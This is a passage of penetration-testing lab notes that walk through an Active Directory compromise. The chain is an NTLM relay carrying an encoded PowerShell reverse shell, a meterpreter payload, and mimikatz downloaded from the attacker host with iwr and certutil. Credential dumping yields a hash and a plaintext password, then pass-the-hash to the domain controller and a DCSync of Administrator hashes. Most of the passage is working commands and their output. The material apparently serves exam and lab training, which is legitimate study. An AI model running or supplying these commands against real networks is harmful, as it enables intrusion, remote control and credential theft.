sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.181.242 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA2ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

# New Tab
rlwrap nc -nlvp 9999
```
	- --no-http-server - Disable HTTP server
	- -smb2support - Enable SMB2 support
	- Specify external address for MAILSRV1 as target
	- Specify encoded PS revshell to our Kali on port 9999


> Using **rlwrap** will help ensure proper shell operation. 


- Modify the Backup Directory Path of the plugin to point to our Kali and a random dir: `//192.168.45.246/test`
- Should cause the plugin to auth to **impacket-ntlmrelayx** in the context of the user running WP
```bash
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	[*] Protocol Client LDAPS loaded..
	[*] Protocol Client LDAP loaded..
	[*] Protocol Client DCSYNC loaded..
	[*] Protocol Client SMB loaded..
	[*] Protocol Client IMAPS loaded..
	[*] Protocol Client IMAP loaded..
	[*] Protocol Client RPC loaded..
	[*] Protocol Client SMTP loaded..
	[*] Protocol Client MSSQL loaded..
	[*] Protocol Client HTTP loaded..
	[*] Protocol Client HTTPS loaded..
	[*] Running in relay mode to single host
	[*] Setting up SMB Server
	[*] Setting up WCF Server
	[*] Setting up RAW Server on port 6666
	
	[*] Servers started, waiting for connections
	[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.181.242, attacking target smb://192.168.181.242
	[*] Authenticating against smb://192.168.181.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
```

- In listener tab
```bash
rlwrap nc -nlvp 9999
listening on [any] 9999 ...
connect to [192.168.45.246] from (UNKNOWN) [192.168.181.242] 51153

whoami
	nt authority\system
PS C:\Windows\system32> hostname
	MAILSRV1
```


# Gaining Access to DC

### MAILSRV1 - 242
- Obtained privileged RCE on

#### Cached Creds

> Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system.
> This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for `beccy`

- Meterpreter - Had to use as mimikatz would freeze MAILSRV1
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.151 LPORT=5555 -f exe -o exploits/met.exe

sudo msfconsole -q

msf6 > use multi/handler
	[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
	payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.45.151
	LHOST => 192.168.45.151

msf6 exploit(multi/handler) > set LPORT 5555
	LPORT => 5555

msf6 exploit(multi/handler) > set ExitOnSession false
	ExitOnSession => false

msf6 exploit(multi/handler) > run -j
	[*] Exploit running as background job 0.
	[*] Exploit completed, but no session was created.
	[*] Started HTTPS reverse handler on https://192.168.45.151:5555
```

- MAILSRV1
```powershell
.\met.exe
```

- Meterpreter
```bash
msf6 > multi/manage/autoroute

msf6 post(multi/manage/autoroute) > sessions -i 2
	[*] Starting interaction with 2...

meterpreter > shell
	Process 4952 created.
	Channel 1 created.
	Microsoft Windows [Version 10.0.20348.1006]
	(c) Microsoft Corporation. All rights reserved.

C:\users\beccy> powershell
```

- Get mimikatz on MAILSRV1
```powershell
iwr -uri http://192.168.45.151:8000/mimikatz.exe -outfile mimikatz.exe
```

- Attempt to extract NTLM hash or cleartext pw of `beccy`
```powershell
.\mimikatz.exe

	  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
	  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
	Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
	...
	Authentication Id : 0 ; 331497 (00000000:00050ee9)
	Session           : Interactive from 1
	User Name         : beccy
	Domain            : BEYOND
	Logon Server      : DCSRV1
	Logon Time        : 4/9/2024 12:38:32 AM
	SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
	        msv :
	         [00000003] Primary
	         * Username : beccy
	         * Domain   : BEYOND
	         * NTLM     : f0397ec5af49971f6efbdb07877046b3
	         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
	         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
	        tspkg :
	        wdigest :
	         * Username : beccy
	         * Domain   : BEYOND
	         * Password : (null)
	        kerberos :
	         * Username : beccy
	         * Domain   : BEYOND.COM
	         * Password : NiftyTopekaDevolve6655!#!
	...
```
	- Got both NTLM hash and plaintext password

#### Lateral Movement

Technically we can use the plaintext password, however, let's pass the NTLM hash to gain access to DCSRV1
```bash
impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.134.240
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	[*] Requesting shares on 172.16.134.240.....
	[*] Found writable share ADMIN$
	[*] Uploading file NKiVORoP.exe
	[*] Opening SVCManager on 172.16.134.240.....
	[*] Creating service jsmp on 172.16.134.240.....
	[*] Starting service jsmp.....
	[!] Press help for extra shell commands
	Microsoft Windows [Version 10.0.20348.1006]
	(c) Microsoft Corporation. All rights reserved.
	
	C:\Windows\system32> whoami
		nt authority\system
	
	C:\Windows\system32> hostname
		DCSRV1
	
	C:\Windows\system32> ipconfig 
		 
		Windows IP Configuration
		
		
		Ethernet adapter Ethernet0:
		
		   Connection-specific DNS Suffix  . : 
		   IPv4 Address. . . . . . . . . . . : 172.16.134.240
		   Subnet Mask . . . . . . . . . . . : 255.255.255.0
		   Default Gateway . . . . . . . . . : 172.16.134.254
```

- Download mimikatz and perform a dcsync on Administrator user on DCSRV1
```powershell
certutil.exe -urlcache -f http://192.168.45.151:8000/mimikatz.exe mimikatz.exe

.\mimikatz.exe
lsadump::dcsync /user:beyond\Administrator
	mimikatz # [DC] 'beyond.com' will be the domain
	[DC] 'DCSRV1.beyond.com' will be the DC server
	[DC] 'beyond\Administrator' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	
	Object RDN           : Administrator
	
	** SAM ACCOUNT **
	
	SAM Username         : Administrator
	Account Type         : 30000000 ( USER_OBJECT )
	User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
	Account expiration   : 
	Password last change : 10/13/2022 6:18:37 AM
	Object Security ID   : S-1-5-21-1104084343-2915547075-2081307249-500
	Object Relative ID   : 500
	
	Credentials:
	  Hash NTLM: 8480fa6ca85394df498139fe5ca02b95
	    ntlm- 0: 8480fa6ca85394df498139fe5ca02b95
	    ntlm- 1: a07fc8cbdda7f2d4515a6aab11da28c7
	    lm  - 0: ba6a26fc17bd17723b09004a956c8590
	
	Supplemental Credentials:
	* Primary:NTLM-Strong-NTOWF *
	    Random Value : bc01f5d3e69ef9268807bcbf786e34b8
	
	* Primary:Kerberos-Newer-Keys *
	    Default Salt : BEYOND.COMAdministrator
	    Default Iterations : 4096
	    Credentials
	      aes256_hmac       (4096) : e8d0b7aa861dffd552fcfa803856fd0cdf909fa6966eb450d583a7bcaef1263f
	      aes128_hmac       (4096) : b0c54be1f0740f4731a09152aea71669
	      des_cbc_md5       (4096) : 677f5249132c3b68
	    OldCredentials
	      aes256_hmac       (4096) : 593c25cafcc1345cc4c6cb211e325ac06b41686a5b0078627ce63725b0a969f3
	      aes128_hmac       (4096) : 553aa0a4d21dde1bc79022b19827bb73
	      des_cbc_md5       (4096) : d3914997dfa8294f
	
	* Primary:Kerberos *
	    Default Salt : BEYOND.COMAdministrator
	    Credentials
	      des_cbc_md5       : 677f5249132c3b68
	    OldCredentials
	      des_cbc_md5       : d3914997dfa8294f
	
	* Packages *
	    NTLM-Strong-NTOWF
	
	* Primary:WDigest *
	    01  290c9f35f8d308ce517caad823188fad
	    02  4a5c81b76aa83a40ba3477b88f837b41
	    03  bdff8d83ee50ba0e807b5492e7b041a0
	    04  290c9f35f8d308ce517caad823188fad
	    05  91f91b38e4542d5d2d6cb8fefdd48f65
	    06  4e328abc1ce3d683b48e0a3dde03f21c
	    07  18b760c48e0a2c7bd81980e6dac56bfe
	    08  ad5c6178d46ba3bda9d1469a0c823c43
	    09  b5ca9dc10303f5aa2ba7afef40517c14
	    10  3dcb8edaae22ac9f3133a062e9ab7cc2
	    11  c0debaabf591f241d2afdbde7a323ef0
	    12  ad5c6178d46ba3bda9d1469a0c823c43
	    13  a6291c55f97cacd7e421b0d73e1c67da
	    14  9578af8daece8dce81b4a5095371a80b
	    15  5257cd6abc3064a0c1da468c2ea1d92c
	    16  5e023ab0283d0052a9849844c063291e
	    17  316de794086098880cb44cecf4de3151
	    18  de04d98735990f190e3ecd5ba4119dfb
	    19  7c02cece16fc896082acf187500291b5
	    20  bd4f04838065451e1d051905583de21e
	    21  647d56e1f298e5d40d0c5451dddbf576
	    22  3c49fd98484aef9f92eb3471488ab445
	    23  e9b7a94ff81039e77560d86f021bdeb8
	    24  00b6332ef3afbeb768c0ddf336b179f3
	    25  e3889b9852ac978ee6d7796c37433e72
	    26  a56bb124b942764ad96d06314b892550
	    27  fb36c420b43676895f8319328cd2d97b
	    28  da56b1ea3368c4ec27c8fbb82c2e63bb
	    29  3bb1559c5107551743a709fcf6802fe8
```